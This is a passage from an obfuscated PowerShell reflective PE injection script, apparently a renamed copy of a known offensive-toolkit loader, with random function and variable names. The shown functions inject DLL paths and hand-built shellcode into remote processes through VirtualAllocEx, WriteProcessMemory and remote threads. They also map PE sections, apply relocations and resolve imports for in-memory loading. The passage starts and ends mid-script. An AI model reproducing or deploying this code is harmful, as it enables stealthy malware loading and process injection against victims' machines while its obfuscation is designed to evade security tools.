		$PEInfo | Add-Member -MemberType NoteProperty -Name PEHandle -Value $jdNQCSwb99
		$PEInfo | Add-Member -MemberType NoteProperty -Name IMAGE_NT_HEADERS -Value ($uRGiFNCk99.IMAGE_NT_HEADERS)
		$PEInfo | Add-Member -MemberType NoteProperty -Name NtHeadersPtr -Value ($uRGiFNCk99.NtHeadersPtr)
		$PEInfo | Add-Member -MemberType NoteProperty -Name PE64Bit -Value ($uRGiFNCk99.PE64Bit)
		$PEInfo | Add-Member -MemberType NoteProperty -Name 'SizeOfImage' -Value ($uRGiFNCk99.IMAGE_NT_HEADERS.OptionalHeader.SizeOfImage)
		
		if ($PEInfo.PE64Bit -eq $true)
		{
			[IntPtr]$xhjgUVLp99 = [IntPtr](Cinerama ([Int64]$PEInfo.NtHeadersPtr) ([System.Runtime.InteropServices.Marshal]::SizeOf([Type]$mVRcZsGx99.IMAGE_NT_HEADERS64)))
			$PEInfo | Add-Member -MemberType NoteProperty -Name SectionHeaderPtr -Value $xhjgUVLp99
		}
		else
		{
			[IntPtr]$xhjgUVLp99 = [IntPtr](Cinerama ([Int64]$PEInfo.NtHeadersPtr) ([System.Runtime.InteropServices.Marshal]::SizeOf([Type]$mVRcZsGx99.IMAGE_NT_HEADERS32)))
			$PEInfo | Add-Member -MemberType NoteProperty -Name SectionHeaderPtr -Value $xhjgUVLp99
		}
		
		if (($uRGiFNCk99.IMAGE_NT_HEADERS.FileHeader.Characteristics -band $Win32Constants.IMAGE_FILE_DLL) -eq $Win32Constants.IMAGE_FILE_DLL)
		{
			$PEInfo | Add-Member -MemberType NoteProperty -Name FileType -Value 'DLL'
		}
		elseif (($uRGiFNCk99.IMAGE_NT_HEADERS.FileHeader.Characteristics -band $Win32Constants.IMAGE_FILE_EXECUTABLE_IMAGE) -eq $Win32Constants.IMAGE_FILE_EXECUTABLE_IMAGE)
		{
			$PEInfo | Add-Member -MemberType NoteProperty -Name FileType -Value 'EXE'
		}
		else
		{
			Throw "PE file is not an EXE or DLL"
		}
		
		return $PEInfo
	}
	
	
	Function stillborn
	{
		Param(
		[Parameter(Position=0, Mandatory=$true)]
		[IntPtr]
		$NNjQlKkH99,
		
		[Parameter(Position=1, Mandatory=$true)]
		[IntPtr]
		$PEITKcfj99
		)
		
		$TLnkrdSP99 = [System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr])
		
		$nEmrKiLD99 = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi($PEITKcfj99)
		$RkZVdGyJ99 = [UIntPtr][UInt64]([UInt64]$nEmrKiLD99.Length + 1)
		$ofzmrzCc99 = $lTqSCtGJ99.VirtualAllocEx.Invoke($NNjQlKkH99, [IntPtr]::Zero, $RkZVdGyJ99, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_READWRITE)
		if ($ofzmrzCc99 -eq [IntPtr]::Zero)
		{
			Throw "Unable to allocate memory in the remote process"
		}
		[UIntPtr]$QhJDDTcO99 = [UIntPtr]::Zero
		$nYGBOReT99 = $lTqSCtGJ99.WriteProcessMemory.Invoke($NNjQlKkH99, $ofzmrzCc99, $PEITKcfj99, $RkZVdGyJ99, [Ref]$QhJDDTcO99)
		
		if ($nYGBOReT99 -eq $false)
		{
			Throw "Unable to write DLL path to remote process memory"
		}
		if ($RkZVdGyJ99 -ne $QhJDDTcO99)
		{
			Throw "Didn't write the expected amount of bytes when writing a DLL path to load to the remote process"
		}
		
		$rXfMTUTV99 = $lTqSCtGJ99.GetModuleHandle.Invoke("kernel32.dll")
		$LuUmlXsj99 = $lTqSCtGJ99.GetProcAddress.Invoke($rXfMTUTV99, "LoadLibraryA") #Kernel32 loaded to the same address for all processes
		
		[IntPtr]$evmHpmVg99 = [IntPtr]::Zero
		if ($PEInfo.PE64Bit -eq $true)
		{
			$YJLCaXBu99 = $lTqSCtGJ99.VirtualAllocEx.Invoke($NNjQlKkH99, [IntPtr]::Zero, $RkZVdGyJ99, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_READWRITE)
			if ($YJLCaXBu99 -eq [IntPtr]::Zero)
			{
				Throw "Unable to allocate memory in the remote process for the return value of LoadLibraryA"
			}
			
			
			$piZOoNjd99 = @(0x53, 0x48, 0x89, 0xe3, 0x48, 0x83, 0xec, 0x20, 0x66, 0x83, 0xe4, 0xc0, 0x48, 0xb9)
			$PeallJDT99 = @(0x48, 0xba)
			$SMaVkpNl99 = @(0xff, 0xd2, 0x48, 0xba)
			$NQcbLwpZ99 = @(0x48, 0x89, 0x02, 0x48, 0x89, 0xdc, 0x5b, 0xc3)
			
			$AJTTAOEE99 = $piZOoNjd99.Length + $PeallJDT99.Length + $SMaVkpNl99.Length + $NQcbLwpZ99.Length + ($TLnkrdSP99 * 3)
			$bzDhyAcb99 = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($AJTTAOEE99)
			$PEvyIJPf99 = $bzDhyAcb99
			
			Auden -Bytes $piZOoNjd99 -jPtrYrug99 $bzDhyAcb99
			$bzDhyAcb99 = Cinerama $bzDhyAcb99 ($piZOoNjd99.Length)
			[System.Runtime.InteropServices.Marshal]::StructureToPtr($ofzmrzCc99, $bzDhyAcb99, $false)
			$bzDhyAcb99 = Cinerama $bzDhyAcb99 ($TLnkrdSP99)
			Auden -Bytes $PeallJDT99 -jPtrYrug99 $bzDhyAcb99
			$bzDhyAcb99 = Cinerama $bzDhyAcb99 ($PeallJDT99.Length)
			[System.Runtime.InteropServices.Marshal]::StructureToPtr($LuUmlXsj99, $bzDhyAcb99, $false)
			$bzDhyAcb99 = Cinerama $bzDhyAcb99 ($TLnkrdSP99)
			Auden -Bytes $SMaVkpNl99 -jPtrYrug99 $bzDhyAcb99
			$bzDhyAcb99 = Cinerama $bzDhyAcb99 ($SMaVkpNl99.Length)
			[System.Runtime.InteropServices.Marshal]::StructureToPtr($YJLCaXBu99, $bzDhyAcb99, $false)
			$bzDhyAcb99 = Cinerama $bzDhyAcb99 ($TLnkrdSP99)
			Auden -Bytes $NQcbLwpZ99 -jPtrYrug99 $bzDhyAcb99
			$bzDhyAcb99 = Cinerama $bzDhyAcb99 ($NQcbLwpZ99.Length)
			
			$rPQQXGIS99 = $lTqSCtGJ99.VirtualAllocEx.Invoke($NNjQlKkH99, [IntPtr]::Zero, [UIntPtr][UInt64]$AJTTAOEE99, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_EXECUTE_READWRITE)
			if ($rPQQXGIS99 -eq [IntPtr]::Zero)
			{
				Throw "Unable to allocate memory in the remote process for shellcode"
			}
			
			$nYGBOReT99 = $lTqSCtGJ99.WriteProcessMemory.Invoke($NNjQlKkH99, $rPQQXGIS99, $PEvyIJPf99, [UIntPtr][UInt64]$AJTTAOEE99, [Ref]$QhJDDTcO99)
			if (($nYGBOReT99 -eq $false) -or ([UInt64]$QhJDDTcO99 -ne [UInt64]$AJTTAOEE99))
			{
				Throw "Unable to write shellcode to remote process memory."
			}
			
			$MzscwpQY99 = interpretations -LSvQiNgY99 $NNjQlKkH99 -StartAddress $rPQQXGIS99 -lTqSCtGJ99 $lTqSCtGJ99
			$zShguHvf99 = $lTqSCtGJ99.WaitForSingleObject.Invoke($MzscwpQY99, 20000)
			if ($zShguHvf99 -ne 0)
			{
				Throw "Call to CreateRemoteThread to call GetProcAddress failed."
			}
			
			[IntPtr]$fKvsFyWH99 = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($TLnkrdSP99)
			$zShguHvf99 = $lTqSCtGJ99.ReadProcessMemory.Invoke($NNjQlKkH99, $YJLCaXBu99, $fKvsFyWH99, [UIntPtr][UInt64]$TLnkrdSP99, [Ref]$QhJDDTcO99)
			if ($zShguHvf99 -eq $false)
			{
				Throw "Call to ReadProcessMemory failed"
			}
			[IntPtr]$evmHpmVg99 = [System.Runtime.InteropServices.Marshal]::PtrToStructure($fKvsFyWH99, [Type][IntPtr])
			$lTqSCtGJ99.VirtualFreeEx.Invoke($NNjQlKkH99, $YJLCaXBu99, [UIntPtr][UInt64]0, $Win32Constants.MEM_RELEASE) | Out-Null
			$lTqSCtGJ99.VirtualFreeEx.Invoke($NNjQlKkH99, $rPQQXGIS99, [UIntPtr][UInt64]0, $Win32Constants.MEM_RELEASE) | Out-Null
		}
		else
		{
			[IntPtr]$MzscwpQY99 = interpretations -LSvQiNgY99 $NNjQlKkH99 -StartAddress $LuUmlXsj99 -mTRMYGQU99 $ofzmrzCc99 -lTqSCtGJ99 $lTqSCtGJ99
			$zShguHvf99 = $lTqSCtGJ99.WaitForSingleObject.Invoke($MzscwpQY99, 20000)
			if ($zShguHvf99 -ne 0)
			{
				Throw "Call to CreateRemoteThread to call GetProcAddress failed."
			}
			
			[Int32]$kElHCZYt99 = 0
			$zShguHvf99 = $lTqSCtGJ99.GetExitCodeThread.Invoke($MzscwpQY99, [Ref]$kElHCZYt99)
			if (($zShguHvf99 -eq 0) -or ($kElHCZYt99 -eq 0))
			{
				Throw "Call to GetExitCodeThread failed"
			}
			
			[IntPtr]$evmHpmVg99 = [IntPtr]$kElHCZYt99
		}
		
		$lTqSCtGJ99.VirtualFreeEx.Invoke($NNjQlKkH99, $ofzmrzCc99, [UIntPtr][UInt64]0, $Win32Constants.MEM_RELEASE) | Out-Null
		
		return $evmHpmVg99
	}
	
	
	Function humidor
	{
		Param(
		[Parameter(Position=0, Mandatory=$true)]
		[IntPtr]
		$NNjQlKkH99,
		
		[Parameter(Position=1, Mandatory=$true)]
		[IntPtr]
		$iwoHgQyd99,
		
		[Parameter(Position=2, Mandatory=$true)]
		[String]
		$FunctionName
		)
		$TLnkrdSP99 = [System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr])
		$vFYnrmVH99 = [System.Runtime.InteropServices.Marshal]::StringToHGlobalAnsi($FunctionName)
		
		$tasXwYQa99 = [UIntPtr][UInt64]([UInt64]$FunctionName.Length + 1)
		$HMviGiaC99 = $lTqSCtGJ99.VirtualAllocEx.Invoke($NNjQlKkH99, [IntPtr]::Zero, $tasXwYQa99, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_READWRITE)
		if ($HMviGiaC99 -eq [IntPtr]::Zero)
		{
			Throw "Unable to allocate memory in the remote process"
		}
		[UIntPtr]$QhJDDTcO99 = [UIntPtr]::Zero
		$nYGBOReT99 = $lTqSCtGJ99.WriteProcessMemory.Invoke($NNjQlKkH99, $HMviGiaC99, $vFYnrmVH99, $tasXwYQa99, [Ref]$QhJDDTcO99)
		[System.Runtime.InteropServices.Marshal]::FreeHGlobal($vFYnrmVH99)
		if ($nYGBOReT99 -eq $false)
		{
			Throw "Unable to write DLL path to remote process memory"
		}
		if ($tasXwYQa99 -ne $QhJDDTcO99)
		{
			Throw "Didn't write the expected amount of bytes when writing a DLL path to load to the remote process"
		}
		
		$rXfMTUTV99 = $lTqSCtGJ99.GetModuleHandle.Invoke("kernel32.dll")
		$yBFfkvTs99 = $lTqSCtGJ99.GetProcAddress.Invoke($rXfMTUTV99, "GetProcAddress") #Kernel32 loaded to the same address for all processes
		
		$mmNlktQn99 = $lTqSCtGJ99.VirtualAllocEx.Invoke($NNjQlKkH99, [IntPtr]::Zero, [UInt64][UInt64]$TLnkrdSP99, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_READWRITE)
		if ($mmNlktQn99 -eq [IntPtr]::Zero)
		{
			Throw "Unable to allocate memory in the remote process for the return value of GetProcAddress"
		}
		
		
		[Byte[]]$zhvYpcEj99 = @()
		if ($PEInfo.PE64Bit -eq $true)
		{
			$btCQQyhh99 = @(0x53, 0x48, 0x89, 0xe3, 0x48, 0x83, 0xec, 0x20, 0x66, 0x83, 0xe4, 0xc0, 0x48, 0xb9)
			$CCymsmSW99 = @(0x48, 0xba)
			$vLnTgMlI99 = @(0x48, 0xb8)
			$YgCmFNNN99 = @(0xff, 0xd0, 0x48, 0xb9)
			$SKaYpPHd99 = @(0x48, 0x89, 0x01, 0x48, 0x89, 0xdc, 0x5b, 0xc3)
		}
		else
		{
			$btCQQyhh99 = @(0x53, 0x89, 0xe3, 0x83, 0xe4, 0xc0, 0xb8)
			$CCymsmSW99 = @(0xb9)
			$vLnTgMlI99 = @(0x51, 0x50, 0xb8)
			$YgCmFNNN99 = @(0xff, 0xd0, 0xb9)
			$SKaYpPHd99 = @(0x89, 0x01, 0x89, 0xdc, 0x5b, 0xc3)
		}
		$AJTTAOEE99 = $btCQQyhh99.Length + $CCymsmSW99.Length + $vLnTgMlI99.Length + $YgCmFNNN99.Length + $SKaYpPHd99.Length + ($TLnkrdSP99 * 4)
		$bzDhyAcb99 = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($AJTTAOEE99)
		$PEvyIJPf99 = $bzDhyAcb99
		
		Auden -Bytes $btCQQyhh99 -jPtrYrug99 $bzDhyAcb99
		$bzDhyAcb99 = Cinerama $bzDhyAcb99 ($btCQQyhh99.Length)
		[System.Runtime.InteropServices.Marshal]::StructureToPtr($iwoHgQyd99, $bzDhyAcb99, $false)
		$bzDhyAcb99 = Cinerama $bzDhyAcb99 ($TLnkrdSP99)
		Auden -Bytes $CCymsmSW99 -jPtrYrug99 $bzDhyAcb99
		$bzDhyAcb99 = Cinerama $bzDhyAcb99 ($CCymsmSW99.Length)
		[System.Runtime.InteropServices.Marshal]::StructureToPtr($HMviGiaC99, $bzDhyAcb99, $false)
		$bzDhyAcb99 = Cinerama $bzDhyAcb99 ($TLnkrdSP99)
		Auden -Bytes $vLnTgMlI99 -jPtrYrug99 $bzDhyAcb99
		$bzDhyAcb99 = Cinerama $bzDhyAcb99 ($vLnTgMlI99.Length)
		[System.Runtime.InteropServices.Marshal]::StructureToPtr($yBFfkvTs99, $bzDhyAcb99, $false)
		$bzDhyAcb99 = Cinerama $bzDhyAcb99 ($TLnkrdSP99)
		Auden -Bytes $YgCmFNNN99 -jPtrYrug99 $bzDhyAcb99
		$bzDhyAcb99 = Cinerama $bzDhyAcb99 ($YgCmFNNN99.Length)
		[System.Runtime.InteropServices.Marshal]::StructureToPtr($mmNlktQn99, $bzDhyAcb99, $false)
		$bzDhyAcb99 = Cinerama $bzDhyAcb99 ($TLnkrdSP99)
		Auden -Bytes $SKaYpPHd99 -jPtrYrug99 $bzDhyAcb99
		$bzDhyAcb99 = Cinerama $bzDhyAcb99 ($SKaYpPHd99.Length)
		
		$rPQQXGIS99 = $lTqSCtGJ99.VirtualAllocEx.Invoke($NNjQlKkH99, [IntPtr]::Zero, [UIntPtr][UInt64]$AJTTAOEE99, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_EXECUTE_READWRITE)
		if ($rPQQXGIS99 -eq [IntPtr]::Zero)
		{
			Throw "Unable to allocate memory in the remote process for shellcode"
		}
		
		$nYGBOReT99 = $lTqSCtGJ99.WriteProcessMemory.Invoke($NNjQlKkH99, $rPQQXGIS99, $PEvyIJPf99, [UIntPtr][UInt64]$AJTTAOEE99, [Ref]$QhJDDTcO99)
		if (($nYGBOReT99 -eq $false) -or ([UInt64]$QhJDDTcO99 -ne [UInt64]$AJTTAOEE99))
		{
			Throw "Unable to write shellcode to remote process memory."
		}
		
		$MzscwpQY99 = interpretations -LSvQiNgY99 $NNjQlKkH99 -StartAddress $rPQQXGIS99 -lTqSCtGJ99 $lTqSCtGJ99
		$zShguHvf99 = $lTqSCtGJ99.WaitForSingleObject.Invoke($MzscwpQY99, 20000)
		if ($zShguHvf99 -ne 0)
		{
			Throw "Call to CreateRemoteThread to call GetProcAddress failed."
		}
		
		[IntPtr]$fKvsFyWH99 = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($TLnkrdSP99)
		$zShguHvf99 = $lTqSCtGJ99.ReadProcessMemory.Invoke($NNjQlKkH99, $mmNlktQn99, $fKvsFyWH99, [UIntPtr][UInt64]$TLnkrdSP99, [Ref]$QhJDDTcO99)
		if (($zShguHvf99 -eq $false) -or ($QhJDDTcO99 -eq 0))
		{
			Throw "Call to ReadProcessMemory failed"
		}
		[IntPtr]$celfINeu99 = [System.Runtime.InteropServices.Marshal]::PtrToStructure($fKvsFyWH99, [Type][IntPtr])
		$lTqSCtGJ99.VirtualFreeEx.Invoke($NNjQlKkH99, $rPQQXGIS99, [UIntPtr][UInt64]0, $Win32Constants.MEM_RELEASE) | Out-Null
		$lTqSCtGJ99.VirtualFreeEx.Invoke($NNjQlKkH99, $HMviGiaC99, [UIntPtr][UInt64]0, $Win32Constants.MEM_RELEASE) | Out-Null
		$lTqSCtGJ99.VirtualFreeEx.Invoke($NNjQlKkH99, $mmNlktQn99, [UIntPtr][UInt64]0, $Win32Constants.MEM_RELEASE) | Out-Null
		
		return $celfINeu99
	}
	Function melanges
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[Byte[]]
		$sXOvCBLB99,
		
		[Parameter(Position = 1, Mandatory = $true)]
		[System.Object]
		$PEInfo,
		
		[Parameter(Position = 2, Mandatory = $true)]
		[System.Object]
		$lTqSCtGJ99,
		
		[Parameter(Position = 3, Mandatory = $true)]
		[System.Object]
		$mVRcZsGx99
		)
		
		for( $i = 0; $i -lt $PEInfo.IMAGE_NT_HEADERS.FileHeader.NumberOfSections; $i++)
		{
			[IntPtr]$xhjgUVLp99 = [IntPtr](Cinerama ([Int64]$PEInfo.SectionHeaderPtr) ($i * [System.Runtime.InteropServices.Marshal]::SizeOf([Type]$mVRcZsGx99.IMAGE_SECTION_HEADER)))
			$LEWuMgtI99 = [System.Runtime.InteropServices.Marshal]::PtrToStructure($xhjgUVLp99, [Type]$mVRcZsGx99.IMAGE_SECTION_HEADER)
		
			[IntPtr]$jvaxvCck99 = [IntPtr](Cinerama ([Int64]$PEInfo.PEHandle) ([Int64]$LEWuMgtI99.VirtualAddress))
			
			$slEfOHoV99 = $LEWuMgtI99.SizeOfRawData
			if ($LEWuMgtI99.PointerToRawData -eq 0)
			{
				$slEfOHoV99 = 0
			}
			
			if ($slEfOHoV99 -gt $LEWuMgtI99.VirtualSize)
			{
				$slEfOHoV99 = $LEWuMgtI99.VirtualSize
			}
			
			if ($slEfOHoV99 -gt 0)
			{
				enumerations -SbQUqohh99 "melanges::MarshalCopy" -PEInfo $PEInfo -StartAddress $jvaxvCck99 -Size $slEfOHoV99 | Out-Null
				[System.Runtime.InteropServices.Marshal]::Copy($sXOvCBLB99, [Int32]$LEWuMgtI99.PointerToRawData, $jvaxvCck99, $slEfOHoV99)
			}
		
			if ($LEWuMgtI99.SizeOfRawData -lt $LEWuMgtI99.VirtualSize)
			{
				$DuFgJztf99 = $LEWuMgtI99.VirtualSize - $slEfOHoV99
				[IntPtr]$StartAddress = [IntPtr](Cinerama ([Int64]$jvaxvCck99) ([Int64]$slEfOHoV99))
				enumerations -SbQUqohh99 "melanges::Memset" -PEInfo $PEInfo -StartAddress $StartAddress -Size $DuFgJztf99 | Out-Null
				$lTqSCtGJ99.memset.Invoke($StartAddress, 0, [IntPtr]$DuFgJztf99) | Out-Null
			}
		}
	}
	Function remorseless
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[System.Object]
		$PEInfo,
		
		[Parameter(Position = 1, Mandatory = $true)]
		[Int64]
		$nSaoaPxb99,
		
		[Parameter(Position = 2, Mandatory = $true)]
		[System.Object]
		$Win32Constants,
		
		[Parameter(Position = 3, Mandatory = $true)]
		[System.Object]
		$mVRcZsGx99
		)
		
		[Int64]$yNJGPPka99 = 0
		$yytYxPGf99 = $true #Track if the difference variable should be added or subtracted from variables
		[UInt32]$WkyzpWno99 = [System.Runtime.InteropServices.Marshal]::SizeOf([Type]$mVRcZsGx99.IMAGE_BASE_RELOCATION)
		
		if (($nSaoaPxb99 -eq [Int64]$PEInfo.EffectivePEHandle) `
				-or ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.BaseRelocationTable.Size -eq 0))
		{
			return
		}
		elseif ((prognosticator ($nSaoaPxb99) ($PEInfo.EffectivePEHandle)) -eq $true)
		{
			$yNJGPPka99 = spate ($nSaoaPxb99) ($PEInfo.EffectivePEHandle)
			$yytYxPGf99 = $false
		}
		elseif ((prognosticator ($PEInfo.EffectivePEHandle) ($nSaoaPxb99)) -eq $true)
		{
			$yNJGPPka99 = spate ($PEInfo.EffectivePEHandle) ($nSaoaPxb99)
		}
		
		[IntPtr]$epgaqaKz99 = [IntPtr](Cinerama ([Int64]$PEInfo.PEHandle) ([Int64]$PEInfo.IMAGE_NT_HEADERS.OptionalHeader.BaseRelocationTable.VirtualAddress))
		while($true)
		{
			$uXsvtBDC99 = [System.Runtime.InteropServices.Marshal]::PtrToStructure($epgaqaKz99, [Type]$mVRcZsGx99.IMAGE_BASE_RELOCATION)
			if ($uXsvtBDC99.SizeOfBlock -eq 0)
			{
				break
			}
			[IntPtr]$xRwTpODh99 = [IntPtr](Cinerama ([Int64]$PEInfo.PEHandle) ([Int64]$uXsvtBDC99.VirtualAddress))
			$IQAGgPFf99 = ($uXsvtBDC99.SizeOfBlock - $WkyzpWno99) / 2
			for($i = 0; $i -lt $IQAGgPFf99; $i++)
			{
				$mwYWcmFF99 = [IntPtr](Cinerama ([IntPtr]$epgaqaKz99) ([Int64]$WkyzpWno99 + (2 * $i)))
				[UInt16]$UYoZxOEJ99 = [System.Runtime.InteropServices.Marshal]::PtrToStructure($mwYWcmFF99, [Type][UInt16])
				[UInt16]$qDjtHFry99 = $UYoZxOEJ99 -band 0x0FFF
				[UInt16]$gQzswVAS99 = $UYoZxOEJ99 -band 0xF000
				for ($j = 0; $j -lt 12; $j++)
				{
					$gQzswVAS99 = [Math]::Floor($gQzswVAS99 / 2)
				}
				if (($gQzswVAS99 -eq $Win32Constants.IMAGE_REL_BASED_HIGHLOW) `
						-or ($gQzswVAS99 -eq $Win32Constants.IMAGE_REL_BASED_DIR64))
				{			
					[IntPtr]$wIffcEkd99 = [IntPtr](Cinerama ([Int64]$xRwTpODh99) ([Int64]$qDjtHFry99))
					[IntPtr]$uIbDRWwX99 = [System.Runtime.InteropServices.Marshal]::PtrToStructure($wIffcEkd99, [Type][IntPtr])
		
					if ($yytYxPGf99 -eq $true)
					{
						[IntPtr]$uIbDRWwX99 = [IntPtr](Cinerama ([Int64]$uIbDRWwX99) ($yNJGPPka99))
					}
					else
					{
						[IntPtr]$uIbDRWwX99 = [IntPtr](spate ([Int64]$uIbDRWwX99) ($yNJGPPka99))
					}				
					[System.Runtime.InteropServices.Marshal]::StructureToPtr($uIbDRWwX99, $wIffcEkd99, $false) | Out-Null
				}
				elseif ($gQzswVAS99 -ne $Win32Constants.IMAGE_REL_BASED_ABSOLUTE)
				{
					Throw "Unknown relocation found, relocation value: $gQzswVAS99, relocationinfo: $UYoZxOEJ99"
				}
			}
			
			$epgaqaKz99 = [IntPtr](Cinerama ([Int64]$epgaqaKz99) ([Int64]$uXsvtBDC99.SizeOfBlock))
		}
	}
	Function Milton
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[System.Object]
		$PEInfo,
		
		[Parameter(Position = 1, Mandatory = $true)]
		[System.Object]
		$lTqSCtGJ99,
		
		[Parameter(Position = 2, Mandatory = $true)]
		[System.Object]
		$mVRcZsGx99,
		
		[Parameter(Position = 3, Mandatory = $true)]
		[System.Object]
		$Win32Constants,
		
		[Parameter(Position = 4, Mandatory = $false)]
		[IntPtr]
		$NNjQlKkH99
		)
		
		$yoOHRZzi99 = $false
		if ($PEInfo.PEHandle -ne $PEInfo.EffectivePEHandle)
		{
			$yoOHRZzi99 = $true
		}
		
		if ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.ImportTable.Size -gt 0)
		{
			[IntPtr]$gkCoySGI99 = Cinerama ([Int64]$PEInfo.PEHandle) ([Int64]$PEInfo.IMAGE_NT_HEADERS.OptionalHeader.ImportTable.VirtualAddress)
			
			while ($true)
			{
				$RiPPZyhU99 = [System.Runtime.InteropServices.Marshal]::PtrToStructure($gkCoySGI99, [Type]$mVRcZsGx99.IMAGE_IMPORT_DESCRIPTOR)
				
				if ($RiPPZyhU99.Characteristics -eq 0 `
						-and $RiPPZyhU99.FirstThunk -eq 0 `
						-and $RiPPZyhU99.ForwarderChain -eq 0 `
						-and $RiPPZyhU99.Name -eq 0 `
						-and $RiPPZyhU99.TimeDateStamp -eq 0)
				{
					Write-Verbose "Done importing DLL imports"
					break
				}
				$VzhzRdUw99 = [IntPtr]::Zero
				$PEITKcfj99 = (Cinerama ([Int64]$PEInfo.PEHandle) ([Int64]$RiPPZyhU99.Name))
				$nEmrKiLD99 = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi($PEITKcfj99)
				
				if ($yoOHRZzi99 -eq $true)
				{
					$VzhzRdUw99 = stillborn -NNjQlKkH99 $NNjQlKkH99 -PEITKcfj99 $PEITKcfj99
				}
				else
				{
					$VzhzRdUw99 = $lTqSCtGJ99.LoadLibrary.Invoke($nEmrKiLD99)
				}
				if (($VzhzRdUw99 -eq $null) -or ($VzhzRdUw99 -eq [IntPtr]::Zero))
				{
					throw "Error importing DLL, DLLName: $nEmrKiLD99"
				}
				
				[IntPtr]$YunmQqjQ99 = Cinerama ($PEInfo.PEHandle) ($RiPPZyhU99.FirstThunk)
				[IntPtr]$koUZyDre99 = Cinerama ($PEInfo.PEHandle) ($RiPPZyhU99.Characteristics) #Characteristics is overloaded with OriginalFirstThunk
				[IntPtr]$fAIXWsQP99 = [System.Runtime.InteropServices.Marshal]::PtrToStructure($koUZyDre99, [Type][IntPtr])
				
				while ($fAIXWsQP99 -ne [IntPtr]::Zero)
				{
					$EaptUfJn99 = ''
					[IntPtr]$XWToThtX99 = [IntPtr]::Zero
					if([Int64]$fAIXWsQP99 -lt 0)
					{
						$EaptUfJn99 = [Int64]$fAIXWsQP99 -band 0xffff #This is actually a lookup by ordinal
					}
					else
					{
						[IntPtr]$JQlvVZRA99 = Cinerama ($PEInfo.PEHandle) ($fAIXWsQP99)
						$JQlvVZRA99 = Cinerama $JQlvVZRA99 ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][UInt16]))
						$EaptUfJn99 = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi($JQlvVZRA99)
					}
					
					if ($yoOHRZzi99 -eq $true)
					{
						[IntPtr]$XWToThtX99 = humidor -NNjQlKkH99 $NNjQlKkH99 -iwoHgQyd99 $VzhzRdUw99 -FunctionName $EaptUfJn99
					}
                    else
					{
						if($EaptUfJn99 -is [string])
						{
						    [IntPtr]$XWToThtX99 = $lTqSCtGJ99.GetProcAddress.Invoke($VzhzRdUw99, $EaptUfJn99)
						}
						else
						{
						    [IntPtr]$XWToThtX99 = $lTqSCtGJ99.GetProcAddressOrdinal.Invoke($VzhzRdUw99, $EaptUfJn99)
						}
					}
					
					if ($XWToThtX99 -eq $null -or $XWToThtX99 -eq [IntPtr]::Zero)
					{
						Throw "New function reference is null, this is almost certainly a bug in this script. Function: $EaptUfJn99. Dll: $nEmrKiLD99"
					}
					[System.Runtime.InteropServices.Marshal]::StructureToPtr($XWToThtX99, $YunmQqjQ99, $false)
					
					$YunmQqjQ99 = Cinerama ([Int64]$YunmQqjQ99) ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]))
					[IntPtr]$koUZyDre99 = Cinerama ([Int64]$koUZyDre99) ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]))
					[IntPtr]$fAIXWsQP99 = [System.Runtime.InteropServices.Marshal]::PtrToStructure($koUZyDre99, [Type][IntPtr])
				}
				
				$gkCoySGI99 = Cinerama ($gkCoySGI99) ([System.Runtime.InteropServices.Marshal]::SizeOf([Type]$mVRcZsGx99.IMAGE_IMPORT_DESCRIPTOR))
			}
		}
	}
	Function steakhouses
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[UInt32]
		$PVlGjfCj99
		)
		
		$Rwirvjpn99 = 0x0
		if (($PVlGjfCj99 -band $Win32Constants.IMAGE_SCN_MEM_EXECUTE) -gt 0)
		{
			if (($PVlGjfCj99 -band $Win32Constants.IMAGE_SCN_MEM_READ) -gt 0)
			{
				if (($PVlGjfCj99 -band $Win32Constants.IMAGE_SCN_MEM_WRITE) -gt 0)
				{
					$Rwirvjpn99 = $Win32Constants.PAGE_EXECUTE_READWRITE
				}
				else
				{
					$Rwirvjpn99 = $Win32Constants.PAGE_EXECUTE_READ
				}
			}
			else
			{
				if (($PVlGjfCj99 -band $Win32Constants.IMAGE_SCN_MEM_WRITE) -gt 0)
				{
					$Rwirvjpn99 = $Win32Constants.PAGE_EXECUTE_WRITECOPY
				}
				else
				{
					$Rwirvjpn99 = $Win32Constants.PAGE_EXECUTE
				}
			}
		}
		else
		{
			if (($PVlGjfCj99 -band $Win32Constants.IMAGE_SCN_MEM_READ) -gt 0)
			{
				if (($PVlGjfCj99 -band $Win32Constants.IMAGE_SCN_MEM_WRITE) -gt 0)
				{
					$Rwirvjpn99 = $Win32Constants.PAGE_READWRITE
				}
				else
				{
					$Rwirvjpn99 = $Win32Constants.PAGE_READONLY
				}
			}
			else
			{
				if (($PVlGjfCj99 -band $Win32Constants.IMAGE_SCN_MEM_WRITE) -gt 0)
				{
					$Rwirvjpn99 = $Win32Constants.PAGE_WRITECOPY
				}
				else
				{
					$Rwirvjpn99 = $Win32Constants.PAGE_NOACCESS
				}
			}
		}
		
		if (($PVlGjfCj99 -band $Win32Constants.IMAGE_SCN_MEM_NOT_CACHED) -gt 0)
		{
			$Rwirvjpn99 = $Rwirvjpn99 -bor $Win32Constants.PAGE_NOCACHE
		}
		
		return $Rwirvjpn99
	}
	Function tyro
	{
		Param(
